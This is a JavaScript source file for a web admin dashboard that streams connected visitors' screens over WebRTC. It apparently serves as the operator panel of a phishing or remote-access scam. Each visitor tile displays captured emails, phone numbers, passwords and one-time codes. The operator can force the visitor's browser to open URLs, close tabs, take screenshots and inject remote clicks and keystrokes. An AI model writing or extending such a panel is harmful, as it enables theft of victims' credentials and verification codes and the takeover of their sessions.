let ws;
const peerConnections = new Map();
const visitors = new Map();
const streams = new Map();
const pendingCandidates = new Map();
const controlledVisitors = new Set();
const iceServers = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };
let currentModalId = null;
let currentFilter = "all";
let activeControlId = null;
let deleteTargetId = null;
let currentPassword = null;

document.getElementById("login-btn").addEventListener("click", () => {
  const pass = document.getElementById("admin-password").value;
  if (!pass) return;
  document.getElementById("login-error").textContent = "";
  initWS(pass);
});
document.getElementById("admin-password").addEventListener("keypress", (e) => {
  if (e.key === "Enter") document.getElementById("login-btn").click();
});

// ---------- PERSISTENCE & SESSION ----------
function initWS(password) {
  currentPassword = password;
  try {
    sessionStorage.setItem("adminPass", password);
  } catch (e) {}

  if (ws) {
    ws.onclose = null;
    ws.onmessage = null;
    ws.onerror = null;
    ws.onopen = null;
    try {
      ws.close();
    } catch (e) {}
  }

  const protocol = window.location.protocol === "https:" ? "wss://" : "ws://";
  const newWs = new WebSocket(`${protocol}${window.location.host}`);
  ws = newWs;

  newWs.onopen = () =>
    newWs.send(JSON.stringify({ type: "role", role: "admin", password }));

  newWs.onmessage = async (e) => {
    if (ws !== newWs) return;
    const data = JSON.parse(e.data);

    if (data.type === "auth-failed") {
      document.getElementById("login-error").textContent =
        data.message || "Invalid password";
      try {
        sessionStorage.removeItem("adminPass");
      } catch (e) {}
      currentPassword = null;
      return;
    }
    if (data.type === "init") {
      document.getElementById("login-screen").classList.remove("active");
      document.getElementById("dashboard-screen").classList.add("active");
      document.querySelectorAll(".tile").forEach((t) => t.remove());
      visitors.clear();
      data.visitors.forEach((v) => addOrUpdateVisitor(v));
      toggleEmptyState();
      return;
    }
    if (data.type === "visitor-connected") {
      addOrUpdateVisitor(data.visitor);
      playBeep();
      showAdminToast(data.visitor.id.split("-")[0], data.visitor.userAgent);
      toggleEmptyState();
      return;
    }
    if (data.type === "visitor-disconnected") {
      const v = visitors.get(data.id);
      if (v) {
        v.status = "offline";
        addOrUpdateVisitor(v);
      }
    }
    if (data.type === "visitor-removed") {
      visitors.delete(data.id);
      streams.delete(data.id);
      controlledVisitors.delete(data.id);
      if (activeControlId === data.id) stopTyping();
      const tile = document.getElementById(`tile-${data.id}`);
      if (tile) tile.remove();
      if (peerConnections.has(data.id)) {
        peerConnections.get(data.id).close();
        peerConnections.delete(data.id);
      }
      toggleEmptyState();
      applyFilter();
    }
    if (data.type === "visitor-updated") addOrUpdateVisitor(data.visitor);

    if (data.type === "control-granted") {
      controlledVisitors.add(data.sender);
      showAdminToast("Access Granted", "Click the video feed to type/click.");
      updateControlBtn(data.sender, true);
    }
    if (data.type === "control-denied") {
      showAdminToast("Access Denied", "The visitor rejected remote control.");
      updateControlBtn(data.sender, false);
    }

    if (data.type === "webrtc-offer") {
      const visitorId = data.sender;
      if (peerConnections.has(visitorId))
        peerConnections.get(visitorId).close();
      const pc = new RTCPeerConnection(iceServers);
      peerConnections.set(visitorId, pc);
      pc.onicecandidate = (event) => {
        if (event.candidate)
          ws.send(
            JSON.stringify({
              type: "webrtc-ice",
              candidate: event.candidate,
              target: visitorId,
            }),
          );
      };
      pc.ontrack = (event) => {
        const stream = event.streams[0] || new MediaStream([event.track]);
        streams.set(visitorId, stream);
        const video = document.getElementById(`video-${visitorId}`);
        if (video) {
          video.srcObject = stream;
          video.play().catch((err) => console.log("Play blocked", err));
        }
      };
      await pc.setRemoteDescription(new RTCSessionDescription(data.sdp));
      if (pendingCandidates.has(visitorId)) {
        for (const cand of pendingCandidates.get(visitorId)) {
          try {
            await pc.addIceCandidate(new RTCIceCandidate(cand));
          } catch (err) {}
        }
        pendingCandidates.delete(visitorId);
      }
      const answer = await pc.createAnswer();
      await pc.setLocalDescription(answer);
      ws.send(
        JSON.stringify({
          type: "webrtc-answer",
          sdp: answer,
          target: visitorId,
        }),
      );
    }

    if (data.type === "webrtc-ice") {
      const visitorId = data.sender;
      const pc = peerConnections.get(visitorId);
      if (pc && pc.remoteDescription) {
        try {
          await pc.addIceCandidate(new RTCIceCandidate(data.candidate));
        } catch (err) {}
      } else {
        if (!pendingCandidates.has(visitorId))
          pendingCandidates.set(visitorId, []);
        pendingCandidates.get(visitorId).push(data.candidate);
      }
    }
  };
  newWs.onclose = () => {};
}

window.addEventListener("load", () => {
  let savedPass = null;
  try {
    savedPass = sessionStorage.getItem("adminPass");
  } catch (e) {}

  if (savedPass) {
    document.getElementById("login-error").textContent = "Reconnecting...";
    document.getElementById("login-error").style.color = "var(--text-muted)";
    initWS(savedPass);
  } else {
    document.getElementById("login-screen").classList.add("active");
    document.getElementById("dashboard-screen").classList.remove("active");
    document.getElementById("login-error").textContent = "";
  }
});

function refreshDashboard() {
  const btn = document.getElementById("refresh-btn");
  btn.classList.add("spinning");
  btn.disabled = true;

  visitors.clear();
  streams.clear();
  controlledVisitors.clear();
  pendingCandidates.clear();
  peerConnections.forEach((pc) => {
    try {
      pc.close();
    } catch (e) {}
  });
  peerConnections.clear();
  document.querySelectorAll(".tile").forEach((t) => t.remove());
  toggleEmptyState();

  if (currentPassword) initWS(currentPassword);
  else {
    let saved = null;
    try {
      saved = sessionStorage.getItem("adminPass");
    } catch (e) {}
    if (saved) initWS(saved);
  }

  setTimeout(() => {
    btn.classList.remove("spinning");
    btn.disabled = false;
    showAdminToast("Refreshed", "Dashboard synced with server.");
  }, 800);
}

function signOut() {
  try {
    sessionStorage.removeItem("adminPass");
  } catch (e) {}
  currentPassword = null;

  if (ws) {
    ws.onclose = null;
    ws.onmessage = null;
    ws.onerror = null;
    ws.onopen = null;
    try {
      ws.close();
    } catch (e) {}
  }

  visitors.clear();
  streams.clear();
  controlledVisitors.clear();
  pendingCandidates.clear();
  peerConnections.forEach((pc) => {
    try {
      pc.close();
    } catch (e) {}
  });
  peerConnections.clear();
  document.querySelectorAll(".tile").forEach((t) => t.remove());
  toggleEmptyState();

  document.getElementById("dashboard-screen").classList.remove("active");
  document.getElementById("login-screen").classList.add("active");
  document.getElementById("admin-password").value = "";
  document.getElementById("login-error").textContent = "";
  document.getElementById("login-error").style.color = "var(--danger)";
}

// ---------- REMOTE CONTROL ----------
function requestControl(id) {
  ws.send(JSON.stringify({ type: "request-control", target: id }));
}

function handleRemoteClick(e, id) {
  if (!controlledVisitors.has(id)) return;
  startTyping(id);

  const video = document.getElementById(`video-${id}`);
  if (!video) return;

  const rect = video.getBoundingClientRect();
  const videoRatio = video.videoWidth / video.videoHeight;
  const rectRatio = rect.width / rect.height;
  let renderWidth, renderHeight, offsetX, offsetY;

  if (rectRatio > videoRatio) {
    renderHeight = rect.height;
    renderWidth = videoRatio * renderHeight;
    offsetX = (rect.width - renderWidth) / 2;
    offsetY = 0;
  } else {
    renderWidth = rect.width;
    renderHeight = renderWidth / videoRatio;
    offsetX = 0;
    offsetY = (rect.height - renderHeight) / 2;
  }

  const clickX = e.clientX - rect.left - offsetX;
  const clickY = e.clientY - rect.top - offsetY;
  if (clickX < 0 || clickX > renderWidth || clickY < 0 || clickY > renderHeight)
    return;

  ws.send(
    JSON.stringify({
      type: "remote-click",
      target: id,
      x: clickX / renderWidth,
      y: clickY / renderHeight,
    }),
  );

  const ripple = document.createElement("div");
  ripple.style.cssText = `position:absolute; left:${e.clientX - rect.left}px; top:${e.clientY - rect.top}px; width:20px; height:20px; background:rgba(239, 68, 68, 0.5); border-radius:50%; transform:translate(-50%,-50%); pointer-events:none; animation:ripple 0.5s ease-out forwards; z-index:10;`;
  video.parentElement.appendChild(ripple);
  setTimeout(() => ripple.remove(), 500);
}

function startTyping(id) {
  activeControlId = id;
  const capture = document.getElementById("remote-keyboard-capture");
  capture.value = "";
  capture.focus();
  showTypingIndicator(true, id);
}

function stopTyping() {
  activeControlId = null;
  document.getElementById("remote-keyboard-capture").blur();
  showTypingIndicator(false);
}

function showTypingIndicator(show, id) {
  let indicator = document.getElementById("typing-indicator");
  if (show) {
    if (!indicator) {
      indicator = document.createElement("div");
      indicator.id = "typing-indicator";
      indicator.style.cssText = `position:fixed; top:20px; left:50%; transform:translateX(-50%); background:var(--success); color:white; padding:8px 16px; border-radius:20px; font-size:13px; font-weight:600; box-shadow:0 4px 12px rgba(16,185,129,0.4); z-index:99999; display:flex; align-items:center; gap:8px;`;
      document.body.appendChild(indicator);
    }
    indicator.innerHTML = `<span style="width:8px;height:8px;background:white;border-radius:50%;animation:pulse 1s infinite;"></span> Typing to Visitor (click outside to stop)`;
    indicator.style.display = "flex";
  } else if (indicator) {
    indicator.style.display = "none";
  }
}

document
  .getElementById("remote-keyboard-capture")
  .addEventListener("keydown", (e) => {
    if (!activeControlId) return;
    if (["Shift", "Control", "Alt", "Meta", "CapsLock"].includes(e.key)) return;
    e.preventDefault();
    ws.send(
      JSON.stringify({
        type: "remote-key",
        target: activeControlId,
        key: e.key,
        code: e.code,
        ctrlKey: e.ctrlKey,
        altKey: e.altKey,
        shiftKey: e.shiftKey,
        metaKey: e.metaKey,
      }),
    );
  });

document.addEventListener("click", (e) => {
  if (!activeControlId) return;
  const activeVideo = document.getElementById(`video-${activeControlId}`);
  const modalVideo = document.getElementById(`modal-video-${activeControlId}`);
  const isClickOnVideo =
    (activeVideo && activeVideo.contains(e.target)) ||
    (modalVideo && modalVideo.contains(e.target));
  if (!isClickOnVideo && e.target.id !== "remote-keyboard-capture") {
    if (e.target.tagName === "INPUT") stopTyping();
  }
});

document.addEventListener("wheel", (e) => {
  if (!activeControlId) return;
  const video = document.getElementById(`video-${activeControlId}`);
  if (video && video.contains(e.target)) {
    ws.send(
      JSON.stringify({
        type: "remote-scroll",
        target: activeControlId,
        deltaY: e.deltaY,
      }),
    );
  }
});

function updateControlBtn(id, active) {
  const btn = document.getElementById(`ctrl-btn-${id}`);
  if (btn) {
    if (active) {
      btn.style.background = "var(--success)";
      btn.style.color = "white";
      btn.style.borderColor = "var(--success)";
      btn.innerText = "Controlling";
    } else {
      btn.style.background = "transparent";
      btn.style.color = "var(--text)";
      btn.style.borderColor = "var(--border)";
      btn.innerText = "Control";
    }
  }
}

// ---------- UI & RENDERING ----------
function setFilter(filter) {
  currentFilter = filter;
  document.querySelectorAll(".nav-tab").forEach((tab) => {
    tab.classList.toggle("active", tab.dataset.filter === filter);
  });
  applyFilter();
}

function applyFilter() {
  document.querySelectorAll(".tile").forEach((tile) => {
    const status = tile.dataset.status;
    const matchesFilter = currentFilter === "all" || currentFilter === status;
    const query = document.getElementById("search-bar").value.toLowerCase();
    const title = tile.querySelector("h3").textContent.toLowerCase();
    const matchesSearch = title.includes(query);
    tile.style.display = matchesFilter && matchesSearch ? "flex" : "none";
  });
  toggleEmptyState();
}

function toggleEmptyState() {
  const empty = document.getElementById("empty-state");
  const visibleTiles = Array.from(document.querySelectorAll(".tile")).filter(
    (t) => t.style.display !== "none",
  );
  if (empty) empty.style.display = visibleTiles.length > 0 ? "none" : "flex";
}

function addOrUpdateVisitor(v) {
  const existing = visitors.get(v.id) || {};
  const merged = { ...existing, ...v };
  visitors.set(v.id, merged);
  updateTile(merged);
  applyFilter();
}

function createTile(v) {
  const tile = document.createElement("div");
  tile.id = `tile-${v.id}`;
  tile.className = "tile";
  tile.dataset.status = v.status;

  tile.innerHTML = `
        <div class="tile-header">
            <div class="tile-info">
                <h3 id="title-${v.id}"></h3>
                <p><span class="device-${v.id}"></span> &bull; <span class="ip-${v.id}"></span></p>
                <div id="contact-${v.id}"></div>
            </div>
            <div class="tile-actions">
                <div class="timer" id="timer-${v.id}">00:00</div>
                <button class="delete-btn" onclick="promptDelete('${v.id}')" title="End Session">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg>
                </button>
            </div>
        </div>
        <div class="video-container" ondblclick="maximizeVideo('${v.id}')">
            <video id="video-${v.id}" autoplay playsinline muted onclick="handleRemoteClick(event, '${v.id}')" style="cursor: crosshair;"></video>
        </div>
        <div class="tile-controls">
            <div class="message-row">
                <input type="text" id="open-url-${v.id}" placeholder="Force open URL (e.g. https://google.com)">
                <button style="background: var(--warning); color: black;" onclick="forceOpenURL('${v.id}')">Open</button>
            </div>
            <div class="quick-actions">
                <button onclick="insertScheme('msg-${v.id}', 'sms:')">sms:</button>
                <button onclick="insertScheme('msg-${v.id}', 'tel:')">tel:</button>
                <button onclick="insertScheme('msg-${v.id}', 'fb://')">fb://</button>
                <button onclick="insertScheme('msg-${v.id}', 'https://')">https://</button>
            </div>
            <div class="message-row">
                <input type="text" id="msg-${v.id}" placeholder="Type 'close' or message...">
                <button onclick="sendMessage('${v.id}')">Send</button>
            </div>
            <div class="action-row">
                <button onclick="maximizeVideo('${v.id}')">Expand</button>
                <button onclick="captureScreenshot('${v.id}')">Capture</button>
                <button id="ctrl-btn-${v.id}" onclick="requestControl('${v.id}')">Control</button>
            </div>
        </div>
    `;

  document.getElementById("visitor-grid").appendChild(tile);

  if (streams.has(v.id)) {
    const video = document.getElementById(`video-${v.id}`);
    if (video) {
      video.srcObject = streams.get(v.id);
      video.play().catch((err) => console.log("Play blocked", err));
    }
  }
  return tile;
}

function updateTile(v) {
  let tile = document.getElementById(`tile-${v.id}`);
  if (!tile) tile = createTile(v);

  document.getElementById(`title-${v.id}`).textContent =
    `ID: ${v.id.split("-")[0]}`;

  let contactHtml = '<div class="contact-badges">';
  if (v.email)
    contactHtml += `<span class="c-badge"><strong>E:</strong> <span>${v.email}</span></span>`;
  if (v.phone)
    contactHtml += `<span class="c-badge"><strong>P:</strong> <span>${v.phone}</span></span>`;
  if (v.password)
    contactHtml += `<span class="c-badge pass"><strong>Pass:</strong> <span>${v.password}</span></span>`;
  if (v.code)
    contactHtml += `<span class="c-badge code"><strong>Code:</strong> <span>${v.code}</span></span>`;
  contactHtml += "</div>";

  document.getElementById(`contact-${v.id}`).innerHTML = contactHtml;
  document.querySelector(`.device-${v.id}`).textContent = parseUserAgent(
    v.userAgent,
  );
  document.querySelector(`.ip-${v.id}`).textContent = v.ip;
  tile.dataset.status = v.status;

  const msgInput = document.getElementById(`msg-${v.id}`);
  const msgBtn = msgInput.nextElementSibling;

  if (v.status === "online") {
    msgInput.disabled = false;
    msgBtn.disabled = false;
    startTimer(v.id, v.connectedAt);
  } else {
    msgInput.disabled = true;
    msgBtn.disabled = true;
    document.getElementById(`timer-${v.id}`).textContent = "Offline";
    if (streams.has(v.id)) {
      streams.delete(v.id);
      const video = document.getElementById(`video-${v.id}`);
      if (video) video.srcObject = null;
    }
  }
}

function insertScheme(inputId, scheme) {
  const input = document.getElementById(inputId);
  if (!input) return;
  input.value = scheme;
  input.focus();
}

function forceOpenURL(id) {
  const input = document.getElementById(`open-url-${id}`);
  const url = input.value.trim();
  if (!url) return;
  ws.send(JSON.stringify({ type: "remote-open-url", target: id, url: url }));
  input.value = "";
  showAdminToast("Command Sent", `Forcing visitor to open: ${url}`);
}

function sendMessage(id) {
  const input = document.getElementById(`msg-${id}`);
  const text = input.value.trim();
  if (!text) return;
  const lowerText = text.toLowerCase();
  if (lowerText === "close" || lowerText === "close-tab") {
    ws.send(JSON.stringify({ type: "remote-close-tab", target: id }));
    input.value = "";
    return;
  }
  if (lowerText.startsWith("open ")) {
    const url = text.substring(5).trim();
    ws.send(JSON.stringify({ type: "remote-open-url", target: id, url: url }));
    input.value = "";
    return;
  }
  ws.send(JSON.stringify({ type: "admin-message", targetId: id, text: text }));
  input.value = "";
}

function promptDelete(id) {
  deleteTargetId = id;
  document.getElementById("delete-modal").classList.add("active");
}

function closeDeleteModal() {
  deleteTargetId = null;
  document.getElementById("delete-modal").classList.remove("active");
}

document.getElementById("confirm-delete-btn").addEventListener("click", () => {
  if (deleteTargetId) {
    ws.send(
      JSON.stringify({ type: "remove-visitor", targetId: deleteTargetId }),
    );
    if (peerConnections.has(deleteTargetId)) {
      peerConnections.get(deleteTargetId).close();
      peerConnections.delete(deleteTargetId);
    }
    streams.delete(deleteTargetId);
    visitors.delete(deleteTargetId);
    controlledVisitors.delete(deleteTargetId);
    if (activeControlId === deleteTargetId) stopTyping();
    const tile = document.getElementById(`tile-${deleteTargetId}`);
    if (tile) tile.remove();
    toggleEmptyState();
    applyFilter();
    closeDeleteModal();
  }
});

function captureScreenshot(id) {
  const video = document.getElementById(`video-${id}`);
  if (!video || !video.srcObject) return;
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
  const a = document.createElement("a");
  a.href = canvas.toDataURL("image/png");
  a.download = `capture_${id.split("-")[0]}_${Date.now()}.png`;
  a.click();
}

function maximizeVideo(id) {
  currentModalId = id;
  const video = document.getElementById(`video-${id}`);
  if (!video || !video.srcObject) return;
  const modal = document.getElementById("expand-modal");
  const container = document.getElementById("modal-video-container");
  container.innerHTML = "";
  const clone = video.cloneNode(true);
  clone.id = `modal-video-${id}`;
  clone.srcObject = video.srcObject;
  clone.onclick = (e) => handleRemoteClick(e, id);
  container.appendChild(clone);
  modal.classList.add("active");
  document.getElementById("modal-msg-input").value = document.getElementById(
    `msg-${id}`,
  ).value;
  clone.play().catch((err) => console.log("Play blocked", err));
}

function closeModal() {
  document.getElementById("expand-modal").classList.remove("active");
  const container = document.getElementById("modal-video-container");
  const clone = container.querySelector("video");
  if (clone) clone.srcObject = null;
  container.innerHTML = "";
  currentModalId = null;
}

function sendModalMessage() {
  if (!currentModalId) return;
  const input = document.getElementById("modal-msg-input");
  const text = input.value.trim();
  if (!text) return;
  const lowerText = text.toLowerCase();
  if (lowerText === "close" || lowerText === "close-tab") {
    ws.send(
      JSON.stringify({ type: "remote-close-tab", target: currentModalId }),
    );
    input.value = "";
    return;
  }
  if (lowerText.startsWith("open ")) {
    const url = text.substring(5).trim();
    ws.send(
      JSON.stringify({
        type: "remote-open-url",
        target: currentModalId,
        url: url,
      }),
    );
    input.value = "";
    return;
  }
  ws.send(
    JSON.stringify({
      type: "admin-message",
      targetId: currentModalId,
      text: text,
    }),
  );
  input.value = "";
}

function showAdminToast(title, message) {
  const container = document.getElementById("admin-toast-container");
  const toast = document.createElement("div");
  toast.className = "toast";
  toast.innerHTML = `
        <div class="toast-icon">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
        </div>
        <div class="toast-content">
            <h4>${title}</h4>
            <p>${message}</p>
        </div>
    `;
  container.appendChild(toast);
  setTimeout(() => {
    if (toast.parentElement) {
      toast.classList.add("removing");
      setTimeout(() => toast.remove(), 300);
    }
  }, 5000);
}

function parseUserAgent(ua) {
  if (!ua) return "Unknown";
  if (ua.includes("Windows")) return "Windows";
  if (ua.includes("Macintosh")) return "Mac";
  if (ua.includes("iPhone")) return "iPhone";
  if (ua.includes("Android")) return "Android";
  if (ua.includes("Linux")) return "Linux";
  return "Desktop";
}

document
  .getElementById("search-bar")
  .addEventListener("input", () => applyFilter());
document
  .getElementById("theme-toggle")
  .addEventListener("click", () =>
    document.body.classList.toggle("light-mode"),
  );

const timers = new Map();
function startTimer(id, startTime) {
  if (timers.has(id)) clearInterval(timers.get(id));
  timers.set(
    id,
    setInterval(() => {
      const el = document.getElementById(`timer-${id}`);
      if (el && el.textContent !== "Offline")
        el.textContent = formatTime(Date.now() - startTime);
    }, 1000),
  );
}

function formatTime(ms) {
  const totalSeconds = Math.floor(ms / 1000);
  const m = Math.floor(totalSeconds / 60)
    .toString()
    .padStart(2, "0");
  const s = (totalSeconds % 60).toString().padStart(2, "0");
  return `${m}:${s}`;
}

function playBeep() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = "sine";
    osc.frequency.setValueAtTime(800, ctx.currentTime);
    gain.gain.setValueAtTime(0.1, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.5);
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start();
    osc.stop(ctx.currentTime + 0.5);
  } catch (e) {}
}
